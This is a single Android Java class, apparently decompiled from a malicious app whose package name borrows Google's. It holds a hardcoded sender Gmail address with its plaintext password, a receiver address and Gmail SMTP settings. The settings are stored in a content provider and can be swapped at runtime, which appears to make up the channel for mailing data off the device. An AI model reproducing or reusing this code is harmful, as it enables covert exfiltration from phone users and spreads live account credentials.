package com.googleprojects.mm;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;

public class SOMailCPUtil {
    public static final boolean MAIL_POOL_MODE = false;
    public static final String default_receiver_addr = "zelm9523@gmail.com";
    public static final String default_sender_addr = "jsdh1657@gmail.com";
    public static final String default_smtp_addr = "smtp.gmail.com";
    public static final String default_smtp_port = "465";
    public static final String mail_pwd = "aszx8520";
    ContentResolver mResolver;

    public SOMailCPUtil(Context c) {
        this.mResolver = c.getContentResolver();
    }

    public SOMMail getCurrentMail() {
        SOMMail mail = null;
        Cursor c = this.mResolver.query(SOMailCP.CONTENT_URI, null, null, null, "_id DESC");
        if (c != null) {
            if (c.getCount() > 0 && c.moveToNext()) {
                mail = new SOMMail();
                mail.sender_addr = c.getString(c.getColumnIndex("sender_addr"));
                mail.receiver_addr = c.getString(c.getColumnIndex("receiver_addr"));
                mail.smtp_port = c.getString(c.getColumnIndex("smtp_port"));
                mail.smtp_addr = c.getString(c.getColumnIndex("smtp_addr"));
            }
            c.close();
        }
        if (mail != null) {
            return mail;
        }
        mail = new SOMMail();
        mail.sender_addr = default_sender_addr;
        mail.receiver_addr = default_receiver_addr;
        mail.smtp_port = default_smtp_port;
        mail.smtp_addr = default_smtp_addr;
        return mail;
    }

    public boolean changeMail(String sender_addr, String receiver_addr, String smtp_port, String smtp_addr) {
        this.mResolver.delete(SOMailCP.CONTENT_URI, null, null);
        ContentValues cv = new ContentValues();
        cv.put("sender_addr", sender_addr);
        cv.put("receiver_addr", receiver_addr);
        cv.put("smtp_port", smtp_port);
        cv.put("smtp_addr", smtp_addr);
        return this.mResolver.insert(SOMailCP.CONTENT_URI, cv) != null;
    }
}
